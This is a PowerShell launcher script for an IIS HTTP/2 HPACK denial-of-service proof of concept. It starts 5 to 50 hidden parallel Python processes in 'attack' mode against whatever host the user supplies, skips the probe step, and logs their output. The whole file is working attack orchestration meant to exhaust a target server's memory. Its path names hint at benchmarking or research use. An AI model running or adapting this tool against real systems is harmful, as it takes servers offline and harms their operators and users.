# IIS Apex multiprocess orchestrator — Windows only
param(
    [Parameter(Mandatory=$true)][Alias("Host")][string]$TargetHost,
    [int]$Port = 443,
    [ValidateSet("8gb","32gb","64gb","96gb")][string]$Preset = "8gb",
    [string]$PocPath = "",
    [string]$PythonExe = "",
    [string]$InstallRoot = "C:\APEX-Ngin2dos",
    [int]$Hold = 120
)

$ErrorActionPreference = "Continue"
if ($PSScriptRoot) {
    $ScriptDir = $PSScriptRoot
} else {
    $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (-not $ScriptDir -or -not (Test-Path $ScriptDir)) {
    $ScriptDir = Join-Path $InstallRoot "benchmark"
}
$PluginRoot = Split-Path -Parent $ScriptDir
if (-not (Test-Path (Join-Path $PluginRoot "vendor"))) {
    $PluginRoot = $InstallRoot
    $ScriptDir = Join-Path $InstallRoot "benchmark"
}

if (-not $PocPath) {
    $PocPath = Join-Path $PluginRoot "vendor\califio-publications\MADBugs\http2-bomb\microsoft-iis\poc\iis_hpack_dos.py"
}
if (-not $PythonExe) {
    $candidates = @(
        (Join-Path $InstallRoot "Python312\python.exe"),
        "C:\Python312\python.exe",
        "python"
    )
    foreach ($c in $candidates) {
        if ($c -eq "python" -or (Test-Path $c)) { $PythonExe = $c; break }
    }
}

$ProcMap = @{
    "8gb"  = 5
    "32gb" = 10
    "64gb" = 20
    "96gb" = 50
}
$Procs = $ProcMap[$Preset]
$LogDir = Join-Path $ScriptDir "logs\iis_apex_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null

Write-Host "=== IIS APEX MP === Preset=$Preset Procs=$Procs Host=$TargetHost`:$Port"
Write-Host "Python: $PythonExe"
Write-Host "PoC: $PocPath"
Write-Host "Logs: $LogDir"

if (-not (Test-Path $PocPath)) {
    Write-Error "PoC not found: $PocPath"
    exit 2
}

$jobs = @()
for ($i = 0; $i -lt $Procs; $i++) {
    $logOut = Join-Path $LogDir "proc_${i}_out.log"
    $logErr = Join-Path $LogDir "proc_${i}_err.log"
    $argList = @(
        $PocPath,
        "--host", $TargetHost,
        "--port", $Port,
        "--mode", "attack",
        "--preset", $Preset,
        "--hold", $Hold,
        "--no-probe"
    )
    $p = Start-Process -FilePath $PythonExe -ArgumentList $argList `
        -RedirectStandardOutput $logOut -RedirectStandardError $logErr `
        -PassThru -WindowStyle Hidden
    $jobs += $p
    Start-Sleep -Milliseconds 500
}

Write-Host "Started $($jobs.Count) processes. PIDs: $($jobs.Id -join ', ')"
Write-Host "Monitor logs in $LogDir"
